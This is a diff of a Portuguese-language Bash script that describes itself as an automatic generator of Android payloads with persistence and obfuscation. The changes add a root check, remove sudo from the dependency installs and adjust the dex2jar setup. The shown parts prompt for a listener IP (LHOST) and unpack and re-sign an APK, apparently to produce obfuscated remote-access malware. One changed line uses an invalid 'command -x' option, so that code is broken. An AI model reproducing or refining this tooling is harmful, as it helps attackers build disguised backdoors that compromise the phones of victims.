@@ -2,6 +2,13 @@
 
 echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="
 
+# Verifica se está rodando como root para instalações
+if [[ $EUID -ne 0 ]]; then
+   echo "Este script precisa ser executado como root para instalar dependências."
+   echo "Por favor, execute: sudo $0"
+   exit 1
+fi
+
 # Detecta IP local automaticamente (primeiro IP da lista)
 DEFAULT_LHOST=$(hostname -I | awk '{print $1}')
 read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
@@ -73,7 +80,7 @@ EOF
 install_apktool() {
     if ! command -v apktool &> /dev/null; then
         echo "[*] apktool não encontrado. Instalando..."
-        sudo apt update && sudo apt install -y apktool
+        apt update && apt install -y apktool
         if [ $? -ne 0 ]; then
             echo "Erro ao instalar apktool. Abortando."
             exit 1
@@ -86,7 +93,7 @@ install_apktool() {
 install_proguard() {
     if ! command -v proguard &> /dev/null; then
         echo "[*] ProGuard não encontrado. Instalando via apt..."
-        sudo apt update && sudo apt install -y proguard
+        apt update && apt install -y proguard
         if [ $? -ne 0 ]; then
             echo "Erro ao instalar ProGuard."
             return 1
@@ -98,7 +105,7 @@ install_proguard() {
 }
 
 install_dex2jar() {
-    if ! command -v d2j-dex2jar.sh &> /dev/null || ! command -v d2j-jar2dex.sh &> /dev/null; then
+    if ! command -x "$(command -v d2j-dex2jar.sh)" &> /dev/null; then
         echo "[*] dex2jar não encontrado. Instalando manualmente..."
 
         DEX2JAR_DIR="$HOME/dex2jar"
@@ -114,8 +121,8 @@ install_dex2jar() {
             rm /tmp/dex2jar.zip
         fi
 
-        # Adiciona dex2jar ao PATH temporariamente
-        export PATH="$DEX2JAR_DIR:$PATH"
+        # Adiciona o diretório correto ao PATH temporariamente
+        export PATH="$DEX2JAR_DIR/dex2jar-2.0:$PATH"
         echo "[*] dex2jar instalado e PATH atualizado temporariamente."
     else
         echo "[*] dex2jar encontrado."
@@ -127,7 +134,7 @@ check_apksigner() {
     if ! command -v apksigner &> /dev/null; then
         echo "[*] apksigner não encontrado."
         echo "[*] Tentando instalar apksigner via apt (pacote apksigner)..."
-        sudo apt update && sudo apt install -y apksigner
+        apt update && apt install -y apksigner
         if [ $? -ne 0 ]; then
             echo "[!] Não foi possível instalar apksigner automaticamente."
             echo "[!] Por favor, instale o Android SDK Build Tools e certifique-se que 'apksigner' está no PATH."
@@ -228,6 +235,7 @@ else
     mkdir -p temp_dex
     unzip -o $OUTPUT_APK classes.dex -d temp_dex
 
+    # Usa o caminho completo para garantir execução
     d2j-dex2jar.sh temp_dex/classes.dex -o temp_dex/classes.jar
     if [ $? -ne 0 ]; then
         echo "Erro ao converter dex para jar com dex2jar."
